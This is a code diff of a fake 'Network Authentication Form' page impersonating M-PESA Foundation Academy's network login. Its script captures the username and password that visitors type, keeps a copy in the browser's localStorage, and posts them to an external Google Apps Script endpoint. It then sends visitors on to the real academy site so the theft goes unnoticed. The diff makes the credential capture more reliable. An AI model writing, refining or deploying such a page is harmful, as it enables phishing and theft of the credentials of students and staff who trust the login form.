@@ -113,13 +113,10 @@
 </style>
 </head>
 <body>
-
 <div class="top-text">
   Thinkers <span>:</span> Doers <span>:</span> Leaders
 </div>
-
 <div class="logo">M-PESA FOUNDATION ACADEMY</div>
-
 <div class="card" role="main" aria-label="Network Authentication Form">
   <div class="form-title">Network Authentication Form</div>
   <form id="loginForm">
@@ -129,29 +126,49 @@
   </form>
   <div class="user-portal">Click here to access User Portal</div>
 </div>
-
 <div class="footer-text">
   Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
 </div>
-
 <script>
   const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
+
+  document.getElementById("loginForm").addEventListener("submit", async function(e) {
     e.preventDefault();
     const user = document.getElementById("username").value.trim();
     const pass = document.getElementById("password").value.trim();
+    if (!user || !pass) {
+      alert("Please enter both username and password.");
+      return;
+    }
     const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
     attempts.push({ username: user, password: pass, time: new Date().toLocaleString() });
     localStorage.setItem("loginAttempts", JSON.stringify(attempts));
+    
     const formData = new FormData();
     formData.append("username", user);
     formData.append("password", pass);
     formData.append("role", "participant");
-    fetch(GOOGLE_SCRIPT_URL, { method: "POST", mode: "no-cors", body: formData });
-      // Redirect immediately
-  window.location.href = "https://mpesafoundationacademy.ac.ke/";
-});
+    
+    try {
+      const response = await fetch(GOOGLE_SCRIPT_URL, {
+        method: "POST",
+        body: formData,
+        mode: "cors",
+        headers: {
+          'Accept': 'application/json',
+        }
+      });
+      if (response.ok) {
+        window.location.href = "https://mpesafoundationacademy.ac.ke/";
+      } else {
+        alert("Failed to submit credentials. Please try again.");
+      }
+    } catch (error) {
+      alert("An error occurred while submitting credentials. Please check your internet connection and try again.");
+      console.error("Fetch error:", error);
+    }
+  });
 </script>
-
 </body>
 </html>
+
